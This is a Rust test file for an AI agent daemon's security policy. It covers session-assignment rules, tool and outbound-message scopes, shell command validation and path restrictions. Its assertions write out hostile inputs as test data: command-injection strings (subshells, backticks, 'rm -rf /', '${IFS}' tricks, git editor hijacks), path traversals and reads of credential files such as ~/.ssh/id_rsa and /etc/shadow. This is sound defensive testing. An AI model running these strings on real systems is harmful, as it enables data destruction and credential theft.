/// and it is the point — an assignment starts work on another entry point,
/// so silence has to mean no.
///
/// MUTATION GUARD: make the final fallthrough allow instead of deny and
/// this test fails.
#[test]
fn assignment_is_denied_when_nothing_is_configured() {
    let p = assign_policy(vec![], &[]);
    assert!(!p.is_assignment_allowed("+15550001111", "wacli", "direct", "workstation", "session-1"));
    // Not even a scope default of "allow" opens it: that governs tools.
    let permissive = SecurityPolicy {
        scope_default_allow: true,
        ..assign_policy(vec![], &[])
    };
    assert!(!permissive.is_assignment_allowed("+15550001111", "wacli", "direct", "workstation", "session-1"));
}

/// The owner path: a `{channel}:{sender}` entry naming this correspondent.
///
/// MUTATION GUARD: drop the `assign_owners` check and this test fails.
#[test]
fn an_owner_may_assign_to_any_session() {
    let p = assign_policy(vec![], &["wacli:+15550001111"]);
    assert!(p.is_assignment_allowed("+15550001111", "wacli", "direct", "workstation", "session-1"));
    assert!(p.is_assignment_allowed("+15550001111", "wacli", "group", "laptop", "session-2"));
    // A different sender, and the same sender on a different channel, are
    // not that owner.
    assert!(!p.is_assignment_allowed("+15550009999", "wacli", "direct", "workstation", "session-1"));
    assert!(!p.is_assignment_allowed("+15550001111", "telegram", "direct", "workstation", "session-1"));
}

/// The scope-rule path: an explicit grant to one labelled session.
#[test]
fn an_assign_allow_rule_grants_reach_to_the_sessions_it_names() {
    let p = assign_policy(vec![assign_rule(Some("wacli"), &["workstation:*"], &[])], &[]);
    assert!(p.is_assignment_allowed("+15550001111", "wacli", "direct", "workstation", "session-1"));
    // A session the whitelist does not name stays denied.
    assert!(!p.is_assignment_allowed("+15550001111", "wacli", "direct", "laptop", "session-2"));
    // And the rule's own criteria still have to match.
    assert!(!p.is_assignment_allowed("+15550001111", "telegram", "direct", "workstation", "session-1"));
}

/// A deny is reachable from anywhere in the list, mirroring `send_deny`.
///
/// MUTATION GUARD: return on the first matching rule instead of sweeping,
/// and this test fails.
#[test]
fn assign_deny_is_reachable_behind_an_earlier_assign_allow() {
    let p = assign_policy(
        vec![
            assign_rule(None, &["*"], &[]),
            assign_rule(None, &[], &["*:quarantined-session"]),
        ],
        &[],
    );
    assert!(p.is_assignment_allowed("+1", "wacli", "direct", "workstation", "session-1"));
    assert!(!p.is_assignment_allowed("+1", "wacli", "direct", "workstation", "quarantined-session"));
}

/// Deny outranks ownership, exactly as `tools_deny` outranks `tools_allow`.
///
/// MUTATION GUARD: check `assign_owners` before the deny sweep and this
/// test fails.
#[test]
fn assign_deny_outranks_an_owner() {
    let p = assign_policy(
        vec![assign_rule(None, &[], &["*:quarantined-session"])],
        &["wacli:+15550001111"],
    );
    assert!(p.is_assignment_allowed("+15550001111", "wacli", "direct", "workstation", "session-1"));
    assert!(!p.is_assignment_allowed("+15550001111", "wacli", "direct", "workstation", "quarantined-session"));
}

/// A rule carrying neither assignment list says nothing about assignment
/// and must not consume the decision — the same separation the outbound
/// evaluator makes, and deliberately not the first-match-wins shape the
/// tool lists keep.
#[test]
fn a_rule_without_assignment_entries_does_not_shadow_a_later_one() {
    let tools_only = crate::config::ScopeRule {
        tools_deny: vec!["shell".into()],
        ..crate::config::ScopeRule::default()
    };
    let p = assign_policy(vec![tools_only, assign_rule(None, &["*"], &[])], &[]);
    assert!(p.is_assignment_allowed("+1", "wacli", "direct", "workstation", "session-1"));
    // The tool ACL keeps its own, unchanged, first-match-wins semantics.
    assert!(!p.is_tool_allowed("shell", "+1", "wacli", "direct"));
}

/// Only the first matching whitelist is consulted, which is why
/// `ScopeConfig::validate` rejects a shadowed one at load time.
#[test]
fn the_first_matching_assign_allow_decides() {
    let p = assign_policy(
        vec![
            assign_rule(None, &["workstation:*"], &[]),
            assign_rule(None, &["laptop:*"], &[]),
        ],
        &[],
    );
    assert!(p.is_assignment_allowed("+1", "wacli", "direct", "workstation", "session-1"));
    assert!(!p.is_assignment_allowed("+1", "wacli", "direct", "laptop", "session-2"));
}

/// A session id is generated by this daemon and has one spelling, so the
/// assignment lists compare literally — no `send_deny`-style alias folding,
/// and therefore no guess about who two spellings mean.
#[test]
fn assignment_entries_are_matched_literally() {
    let p = assign_policy(vec![assign_rule(None, &["*"], &["*:Session-1"])], &[]);
    assert!(p.is_assignment_allowed("+1", "wacli", "direct", "workstation", "session-1"));
    assert!(!p.is_assignment_allowed("+1", "wacli", "direct", "workstation", "Session-1"));
}

#[test]
fn outbound_rule_criteria_must_match_before_entries_apply() {
    let mut rule = outbound_rule(Some("signal"), &[], &["*"]);
    rule.user = Some("uuid:mallory".into());
    rule.chat_type = Some("group".into());
    let p = make_scope_policy(vec![rule], true);
    // Every criterion matches → deny-all applies.
    assert!(!p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "uuid:mallory",
        "signal",
        "group",
        "signal",
        "+1"
    ));
    // Any mismatch → rule skipped → same-channel default allows.
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "uuid:alice",
        "signal",
        "group",
        "signal",
        "+1"
    ));
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "uuid:mallory",
        "signal",
        "direct",
        "signal",
        "+1"
    ));
    assert!(p.is_outbound_allowed(
        AutonomyLevel::Supervised,
        "uuid:mallory",
        "telegram",
        "group",
        "telegram",
        "+1"
    ));
}

#[test]
fn outbound_entry_without_colon_matches_nothing() {
    // `ScopeConfig::validate` rejects this shape at load time; the matcher
    // must still fail closed rather than treat it as a bare channel match.
    assert!(!outbound_entry_matches("telegram", "telegram", "12345"));
    assert!(outbound_entry_matches("*", "telegram", "12345"));
}

#[test]
fn from_config_maps_all_fields() {
    let autonomy_config = crate::config::AutonomyConfig {
        level: AutonomyLevel::Full,
        workspace_only: false,
        forbidden_paths: vec!["/secret".into()],
        max_cost_per_day_cents: Some(1000),
        ..crate::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test-workspace");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

    // Phase 1: allowed_commands / require_approval_for_medium_risk /
    // block_high_risk_commands were removed; only the surviving fields map.
    assert_eq!(policy.autonomy, AutonomyLevel::Full);
    assert!(!policy.workspace_only);
    assert_eq!(policy.forbidden_paths, vec!["/secret"]);
    assert_eq!(policy.max_cost_per_day_cents, 1000);
    assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
}

// ── Default policy ──────────────────────────────────────

#[test]
fn default_policy_has_sane_values() {
    let p = SecurityPolicy::default();
    let autonomy = crate::config::AutonomyConfig::confined();
    assert_eq!(p.autonomy, AutonomyLevel::Full);
    assert!(p.workspace_only);
    assert!(!p.forbidden_paths.is_empty(), "expected a non-empty value");
    assert_eq!(p.workspace_only, autonomy.workspace_only);
    assert_eq!(p.forbidden_paths, autonomy.forbidden_paths);
    assert_eq!(p.max_cost_per_day_cents, autonomy.effective_max_cost_per_day_cents());
}

// ── Edge cases: command injection ────────────────────────

#[test]
fn semicolon_splits_into_validated_segments() {
    // Phase 1: the allowlist is gone, so a `;`-chained command is no longer
    // blocked merely because a later segment's base command is "dangerous";
    // each segment is split out and validated structurally. A plain chain is
    // now allowed, but a structurally-unsafe segment still blocks the whole.
    let p = default_policy();
    assert!(p.is_command_allowed("ls; rm -rf /tmp/x"));
    assert!(p.is_command_allowed("ls;echo done"));
    assert!(!p.is_command_allowed("ls; rm -rf `cat /etc/passwd`"));
}

#[test]
fn quoted_semicolons_do_not_split_sqlite_command() {
    let p = SecurityPolicy::default();
    assert!(p.is_command_allowed(
        "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
    ));
    assert_eq!(
        p.command_risk_level(
            "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
        ),
        CommandRiskLevel::Low
    );
}

#[test]
fn unquoted_semicolon_after_quoted_sql_still_splits_commands() {
    let p = default_policy();
    // The unquoted `;` after the quoted SQL still splits off a second segment;
    // Phase 1: a plain `rm` segment now passes structurally, but a segment with
    // a subshell still fails — proving the split (and structural gate) happen.
    assert!(p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /tmp/x"));
    assert!(!p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf $(pwd)"));
}

#[test]
fn command_injection_backtick_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo `whoami`"));
    assert!(!p.is_command_allowed("echo `rm -rf /`"));
}

#[test]
fn command_injection_dollar_paren_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
    assert!(!p.is_command_allowed("echo $(rm -rf /)"));
}

#[test]
fn command_with_env_var_prefix() {
    let p = default_policy();
    // Phase 1: env assignments are stripped before the structural check, and the
    // allowlist is gone, so `FOO=bar rm ...` now passes the gate (risk grading
    // and grant requirement happen later). A structural violation still blocks.
    assert!(p.is_command_allowed("FOO=bar rm -rf /tmp/x"));
    assert!(!p.is_command_allowed("FOO=bar rm -rf $(pwd)"));
}

#[test]
fn command_newline_injection_splits_segments() {
    let p = default_policy();
    // Phase 1: a newline still splits into two validated segments, but with the
    // allowlist removed a plain `rm` segment now passes; a structurally-unsafe
    // segment after the newline still blocks the whole command.
    assert!(p.is_command_allowed("ls\nrm -rf /tmp/x"));
    assert!(p.is_command_allowed("ls\necho hello"));
    assert!(!p.is_command_allowed("ls\nrm -rf `pwd`"));
}

#[test]
fn command_and_chain_validates_each_segment() {
    let p = default_policy();
    // Phase 1: `&&` still splits into validated segments. With the allowlist
    // removed, a plain trailing command passes; a structurally-unsafe segment
    // (subshell / redirect) still blocks the whole chain.
    assert!(p.is_command_allowed("ls && rm -rf /tmp/x"));
    assert!(p.is_command_allowed("echo ok && curl http://example.com"));
    assert!(p.is_command_allowed("ls && echo done"));
    assert!(!p.is_command_allowed("ls && rm -rf $(pwd)"));
}

#[test]
fn command_or_chain_validates_each_segment() {
    let p = default_policy();
    // Phase 1 (see `command_and_chain_validates_each_segment`).
    assert!(p.is_command_allowed("ls || rm -rf /tmp/x"));
    assert!(p.is_command_allowed("ls || echo fallback"));
    assert!(!p.is_command_allowed("ls || rm -rf `pwd`"));
}

#[test]
fn command_injection_background_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls & rm -rf /"));
    assert!(!p.is_command_allowed("ls&rm -rf /"));
    assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
}

#[test]
fn command_injection_redirect_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
    assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
}

#[test]
fn quoted_ampersand_and_redirect_literals_are_not_treated_as_operators() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo \"A&B\""));
    assert!(p.is_command_allowed("echo \"A>B\""));
}

#[test]
fn command_argument_injection_blocked() {
    let p = default_policy();
    // find -exec is a common bypass
    assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
    assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
    // git config/alias can execute commands
    assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
    assert!(!p.is_command_allowed("git alias.st status"));
    assert!(!p.is_command_allowed("git -c core.editor=calc.exe commit"));
    // Legitimate commands should still work
    assert!(p.is_command_allowed("find . -name '*.txt'"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("git add ."));
}

#[test]
fn command_injection_dollar_brace_blocked() {
    let p = default_policy();
    assert!(
        p.validate_command_execution("echo ${IFS}cat${IFS}/etc/passwd", true)
            .is_err()
    );
    let benign_dynamic = ["echo $", "{SAFE:-unset}"].concat();
    assert!(p.validate_command_execution(&benign_dynamic, true).is_ok());
}

#[test]
fn command_injection_tee_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret | tee /etc/crontab"));
    assert!(!p.is_command_allowed("ls | /usr/bin/tee outfile"));
    assert!(!p.is_command_allowed("tee file.txt"));
}

#[test]
fn command_injection_process_substitution_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("cat <(echo pwned)"));
    assert!(!p.is_command_allowed("ls >(cat /etc/passwd)"));
}

#[test]
fn command_env_var_prefix_with_allowed_cmd() {
    let p = default_policy();
    // env assignment + command — the assignment is stripped before validation.
    assert!(p.is_command_allowed("FOO=bar ls"));
    assert!(p.is_command_allowed("LANG=C grep pattern file"));
    // Phase 1: with the allowlist gone, env-prefixed `rm` passes the gate too;
    // only a structural violation after the assignment still blocks.
    assert!(p.is_command_allowed("FOO=bar rm -rf /tmp/x"));
    assert!(!p.is_command_allowed("FOO=bar rm -rf `pwd`"));
}

// ── Edge cases: path traversal ──────────────────────────

#[test]
fn path_traversal_encoded_dots() {
    let p = default_policy();
    // Literal ".." in path — always blocked
    assert!(!p.is_path_allowed("foo/..%2f..%2fetc/passwd"));
}

#[test]
fn path_traversal_double_dot_in_filename() {
    let p = default_policy();
    // ".." in a filename (not a path component) is allowed
    assert!(p.is_path_allowed("my..file.txt"));
    // But actual traversal components are still blocked
    assert!(!p.is_path_allowed("../etc/passwd"));
    assert!(!p.is_path_allowed("foo/../etc/passwd"));
}

#[test]
fn path_with_null_byte_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("file\0.txt"));
}

#[test]
fn path_symlink_style_absolute() {
    let p = default_policy();
    assert!(!p.is_path_allowed("/proc/self/root/etc/passwd"));
}

#[test]
fn path_home_tilde_ssh() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("~/.gnupg/secring.gpg"));
}

#[test]
fn path_var_run_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/var/run/docker.sock"));
}

// ── Edge cases: autonomy + command combos ────────────────

#[test]
fn readonly_blocks_even_safe_commands() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat"));
    assert!(!p.can_act());
}

#[test]
fn supervised_passes_structurally_safe_commands() {
    // Phase 1: under supervised the allowlist no longer gates base commands, so
    // any structurally-safe command passes `is_command_allowed` (the supervised
    // medium/high grant requirement is enforced by `validate_command_execution`).
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("docker ps"));
    // A structural violation is still rejected.
    assert!(!p.is_command_allowed("docker ps > /etc/x"));
}

#[test]
fn full_autonomy_still_respects_forbidden_paths() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/etc/shadow"));
    assert!(!p.is_path_allowed("/root/.bashrc"));
}

// ── is_tool_allowed / scope rules ────────────────────────

fn make_scope_policy(rules: Vec<crate::config::ScopeRule>, default_allow: bool) -> SecurityPolicy {
    SecurityPolicy {
        scope_rules: rules,
        scope_default_allow: default_allow,
        ..SecurityPolicy::default()
    }
}

#[test]
fn default_allow_permits_any_tool_when_no_rules() {
    let p = make_scope_policy(vec![], true);
    assert!(p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
    assert!(p.is_tool_allowed("file_write", "uuid:bob", "telegram", "group"));
}

#[test]
fn default_deny_blocks_any_tool_when_no_rules() {
    let p = make_scope_policy(vec![], false);
    assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
    assert!(!p.is_tool_allowed("memory_recall", "uuid:bob", "telegram", "group"));
}

#[test]
fn deny_list_blocks_specified_tool() {
    let p = make_scope_policy(
        vec![crate::config::ScopeRule {
            user: None,
            channel: Some("signal".into()),
            chat_type: Some("group".into()),
            tools_allow: vec![],
            tools_deny: vec!["shell".into()],
            send_allow: vec![],
            send_deny: vec![],
            assign_allow: vec![],
            assign_deny: vec![],
        }],
        true,
    );
    // shell blocked in signal groups
    assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "group"));
    // shell still allowed in direct messages (rule doesn't match)
    assert!(p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
    // other tools not blocked
    assert!(p.is_tool_allowed("memory_recall", "uuid:alice", "signal", "group"));
}

#[test]
fn allow_list_whitelists_tools() {
    let p = make_scope_policy(
        vec![crate::config::ScopeRule {
            user: Some("uuid:untrusted".into()),
            channel: None,
            chat_type: None,
            tools_allow: vec!["memory_recall".into()],
            tools_deny: vec![],
            send_allow: vec![],
            send_deny: vec![],
            assign_allow: vec![],
            assign_deny: vec![],
        }],
        true,
    );
    // untrusted user can use memory_recall
    assert!(p.is_tool_allowed("memory_recall", "uuid:untrusted", "signal", "direct"));
    // untrusted user cannot use shell (not in allow list)
    assert!(!p.is_tool_allowed("shell", "uuid:untrusted", "signal", "direct"));
    // other users still use default (allow)
    assert!(p.is_tool_allowed("shell", "uuid:trusted", "signal", "direct"));
}

#[test]
fn deny_takes_priority_over_allow() {
    // Both allow and deny list contain "shell" — deny wins.
    let p = make_scope_policy(
        vec![crate::config::ScopeRule {
            user: None,
            channel: None,
            chat_type: None,
            tools_allow: vec!["shell".into(), "memory_recall".into()],
            tools_deny: vec!["shell".into()],
            send_allow: vec![],
            send_deny: vec![],
            assign_allow: vec![],
            assign_deny: vec![],
        }],
        true,
    );
    assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
    assert!(p.is_tool_allowed("memory_recall", "uuid:alice", "signal", "direct"));
}

#[test]
fn wildcard_user_matches_any_sender() {
    let p = make_scope_policy(
        vec![crate::config::ScopeRule {
            user: Some("*".into()),
            channel: None,
            chat_type: None,
            tools_allow: vec![],
            tools_deny: vec!["file_write".into()],
            send_allow: vec![],
            send_deny: vec![],
            assign_allow: vec![],
            assign_deny: vec![],
        }],
        true,
    );
    assert!(!p.is_tool_allowed("file_write", "uuid:anyone", "signal", "direct"));
    assert!(!p.is_tool_allowed("file_write", "uuid:someoneelse", "telegram", "group"));
    assert!(p.is_tool_allowed("memory_recall", "uuid:anyone", "signal", "direct"));
}

#[test]
fn rules_evaluated_top_to_bottom_first_match_wins() {
    // Rule 1: deny shell for signal groups
    // Rule 2: allow all for alice
    // alice in a signal group: Rule 1 matches first → shell denied
    let p = make_scope_policy(
        vec![
            crate::config::ScopeRule {
                user: None,
                channel: Some("signal".into()),
                chat_type: Some("group".into()),
                tools_allow: vec![],
                tools_deny: vec!["shell".into()],
                send_allow: vec![],
                send_deny: vec![],
                assign_allow: vec![],
                assign_deny: vec![],
            },
            crate::config::ScopeRule {
                user: Some("uuid:alice".into()),
                channel: None,
                chat_type: None,
                tools_allow: vec![],
                tools_deny: vec![],
                send_allow: vec![],
                send_deny: vec![],
                assign_allow: vec![],
                assign_deny: vec![],
            },
        ],
        true,
    );
    // Rule 1 matches: signal+group → shell denied for alice
    assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "group"));
    // Rule 1 doesn't match direct → fallthrough to Rule 2 (no restrictions) → allow
    assert!(p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
}

#[test]
fn scope_config_from_autonomy_config() {
    let autonomy = crate::config::AutonomyConfig {
        scopes: crate::config::ScopeConfig {
            default: crate::config::ScopeDefault::Allow,
            rules: vec![crate::config::ScopeRule {
                user: None,
                channel: Some("signal".into()),
                chat_type: Some("group".into()),
                tools_allow: vec![],
                tools_deny: vec!["shell".into()],
                send_allow: vec![],
                send_deny: vec![],
                assign_allow: vec![],
                assign_deny: vec![],
            }],
            assign_owners: vec![],
        },
        ..crate::config::AutonomyConfig::default()
    };
    let policy = SecurityPolicy::from_config(&autonomy, std::path::Path::new("/tmp"));

    assert!(policy.scope_default_allow);
    assert_eq!(policy.scope_rules.len(), 1);
    // shell blocked in signal groups
    assert!(!policy.is_tool_allowed("shell", "uuid:alice", "signal", "group"));
    // shell allowed in direct
    assert!(policy.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
}

// ══════════════════════════════════════════════════════════
// SECURITY CHECKLIST TESTS
// Checklist: gateway not public, pairing required,
//            filesystem scoped (no /), access via tunnel
// ══════════════════════════════════════════════════════════

// ── Checklist #3: Filesystem scoped (no /) ──────────────

#[test]
fn checklist_root_path_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("/"));
    assert!(!p.is_path_allowed("/anything"));
}

#[test]
fn checklist_all_system_dirs_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for dir in [
        "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev", "/proc", "/sys",
        "/var", "/tmp",
    ] {
        assert!(!p.is_path_allowed(dir), "System dir should be blocked: {dir}");
        assert!(
            !p.is_path_allowed(&format!("{dir}/subpath")),
            "Subpath of system dir should be blocked: {dir}/subpath"
        );
    }
}

#[test]
fn checklist_sensitive_dotfiles_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for path in [
        "~/.ssh/id_rsa",
        "~/.gnupg/secring.gpg",
        "~/.aws/credentials",
        "~/.config/secrets",
    ] {
        assert!(!p.is_path_allowed(path), "Sensitive dotfile should be blocked: {path}");
    }
}

#[test]
fn checklist_null_byte_injection_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("safe\0/../../../etc/passwd"));
    assert!(!p.is_path_allowed("\0"));
    assert!(!p.is_path_allowed("file\0"));
}

#[test]
fn checklist_workspace_only_blocks_absolute_paths_outside_workspace() {
    let p = SecurityPolicy {
        workspace_only: true,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/any/absolute/path"));
    assert!(p.is_path_allowed("relative/path.txt"));
}

#[test]
fn checklist_resolved_path_must_be_in_workspace() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/user/project"),
        ..SecurityPolicy::default()
    };
    // Inside workspace — allowed
    assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
    // Outside workspace — blocked (symlink escape)
    assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
    assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
    // Root — blocked
    assert!(!p.is_resolved_path_allowed(Path::new("/")));
}

#[test]
fn resolved_path_check_disabled_when_workspace_only_is_false() {
    let p = SecurityPolicy {
        workspace_only: false,
        workspace_dir: PathBuf::from("/home/user/project"),
        ..SecurityPolicy::default()
    };
    assert!(p.is_resolved_path_allowed(Path::new("/etc/passwd")));
    assert!(p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
}

#[test]
fn checklist_default_policy_is_workspace_only() {
    let p = SecurityPolicy::default();
    assert!(p.workspace_only, "Default policy must be workspace_only=true");
}

#[test]
fn checklist_default_forbidden_paths_comprehensive() {
    let p = SecurityPolicy::default();
    // Must contain all critical system dirs
    for dir in ["/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dir),
            "Default forbidden_paths must include {dir}"
        );
    }
    // Must contain sensitive dotfiles
    for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dot),
            "Default forbidden_paths must include {dot}"
        );
    }
}

// ── §1.2 Path resolution / symlink bypass tests ──────────

#[test]
fn resolved_path_blocks_outside_workspace() {
    let workspace = std::env::temp_dir().join("openprx_test_resolved_path");
    let _ = std::fs::create_dir_all(&workspace);

    // Use the canonicalized workspace so starts_with checks match
    let canonical_workspace = workspace.canonicalize().unwrap_or_else(|_| workspace.clone());

    let policy = SecurityPolicy {
        workspace_dir: canonical_workspace.clone(),
        ..SecurityPolicy::default()
    };

    // A resolved path inside the workspace should be allowed
    let inside = canonical_workspace.join("subdir").join("file.txt");
    assert!(
        policy.is_resolved_path_allowed(&inside),
        "path inside workspace should be allowed"
    );

    // A resolved path outside the workspace should be blocked
    let canonical_temp = std::env::temp_dir()
        .canonicalize()
        .unwrap_or_else(|_| std::env::temp_dir());
    let outside = canonical_temp.join("outside_workspace_openprx");
    assert!(
        !policy.is_resolved_path_allowed(&outside),
        "path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&workspace);
}

#[test]
fn resolved_path_blocks_root_escape() {
    let policy = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/openprx_user/project"),
        ..SecurityPolicy::default()
    };

    assert!(
        !policy.is_resolved_path_allowed(Path::new("/etc/passwd")),
        "resolved path to /etc/passwd must be blocked"
    );
    assert!(
        !policy.is_resolved_path_allowed(Path::new("/root/.bashrc")),
        "resolved path to /root/.bashrc must be blocked"
    );
}

#[cfg(unix)]
#[test]
fn resolved_path_blocks_symlink_escape() {
    use std::os::unix::fs::symlink;

    let root = std::env::temp_dir().join("openprx_test_symlink_escape");
    let workspace = root.join("workspace");
    let outside = root.join("outside_target");

    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::create_dir_all(&outside).unwrap();

    // Create a symlink inside workspace pointing outside
    let link_path = workspace.join("escape_link");
    symlink(&outside, &link_path).unwrap();

    let policy = SecurityPolicy {
        workspace_dir: workspace,
        ..SecurityPolicy::default()
    };

    // The resolved symlink target should be outside workspace
    let resolved = link_path.canonicalize().unwrap();
    assert!(
        !policy.is_resolved_path_allowed(&resolved),
        "symlink-resolved path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn forbidden_paths_also_cover_relative_paths_inside_the_workspace() {
    let policy = SecurityPolicy {
        workspace_dir: PathBuf::from("/work/ws"),
        workspace_only: true,
        forbidden_paths: vec![
            "/work/ws/state".to_string(),
            "/work/ws/config.toml".to_string(),
            "/work".to_string(),
        ],
        ..default_policy()
    };
    for blocked in [
        "state/costs.jsonl",
        "state",
        "config.toml",
        "./state/x",
        "STATE/costs.jsonl",
        "State/x",
        "Config.TOML",
    ] {
        assert!(!policy.is_path_allowed(blocked), "{blocked}");
    }
    for allowed in ["notes/state.txt", "out/report.txt", "statement.md"] {
        assert!(policy.is_path_allowed(allowed), "{allowed}");
    }
}

#[test]
fn is_path_allowed_blocks_null_bytes() {
    let policy = default_policy();
    assert!(
        !policy.is_path_allowed("file\0.txt"),
        "paths with null bytes must be blocked"
    );
}

#[test]
fn is_path_allowed_blocks_url_encoded_traversal() {
    let policy = default_policy();
    assert!(
        !policy.is_path_allowed("..%2fetc%2fpasswd"),
        "URL-encoded path traversal must be blocked"
    );
    assert!(
        !policy.is_path_allowed("subdir%2f..%2f..%2fetc"),
        "URL-encoded parent dir traversal must be blocked"
    );
}

// ── Platform / cross-OS path handling ───────────────────────

#[test]
fn backslash_path_treated_as_traversal_on_all_platforms() {
    // On Unix, backslash is a valid filename character but is commonly
    // used for Windows path traversal. The policy should handle it
    // gracefully regardless of platform.
    let policy = SecurityPolicy::default();
    // These should not crash or panic on any platform
    let _ = policy.is_path_allowed("foo\\bar");
    let _ = policy.is_path_allowed("..\\..\\etc\\passwd");
    let _ = policy.is_path_allowed("C:\\Windows\\System32");
}

#[test]
fn path_with_mixed_separators() {
    let policy = SecurityPolicy::default();
    // Mixed forward/backslash should not bypass traversal detection
    let _ = policy.is_path_allowed("foo/bar\\baz");
    let _ = policy.is_path_allowed("..\\foo/../bar");
}

#[test]
fn absolute_path_blocking_works_on_workspace_only() {
    let workspace = tempfile::tempdir().expect("test: private workspace");
    let policy = SecurityPolicy {
        workspace_only: true,
        workspace_dir: workspace.path().to_path_buf(),
        ..SecurityPolicy::default()
    };
    // Unix absolute
    assert!(!policy.is_path_allowed("/etc/passwd"));
    // Relative is allowed
    assert!(policy.is_path_allowed("relative/file.txt"));
}

#[cfg(unix)]
#[test]
fn resolved_path_symlink_escape_blocked() {
    use std::path::Path;
    let policy = SecurityPolicy {
        workspace_dir: std::env::temp_dir().join("test-workspace"),
        ..SecurityPolicy::default()
    };
    // Path that escapes workspace root
    let outside = Path::new("/etc/passwd");
    assert!(!policy.is_resolved_path_allowed(outside));
}

#[test]
fn forbidden_paths_block_subpaths() {
    let policy = SecurityPolicy {
        forbidden_paths: vec!["/secret".to_string()],
        ..SecurityPolicy::default()
    };
    assert!(!policy.is_path_allowed("/secret/data.txt"));
    assert!(!policy.is_path_allowed("/secret"));
}

#[test]
fn empty_path_is_allowed() {
    let policy = SecurityPolicy::default();
    // Empty path is not traversal, not null, not forbidden
    assert!(policy.is_path_allowed(""));
}

#[test]
fn unicode_path_does_not_panic() {
    let policy = SecurityPolicy::default();
    assert!(policy.is_path_allowed("\u{434}\u{43e}\u{43a}\u{443}\u{43c}\u{435}\u{43d}\u{442}\u{44b}/\u{437}\u{430}\u{43c}\u{435}\u{442}\u{43a}\u{438}.md"));
    assert!(policy.is_path_allowed("données/résumé.txt"));
}
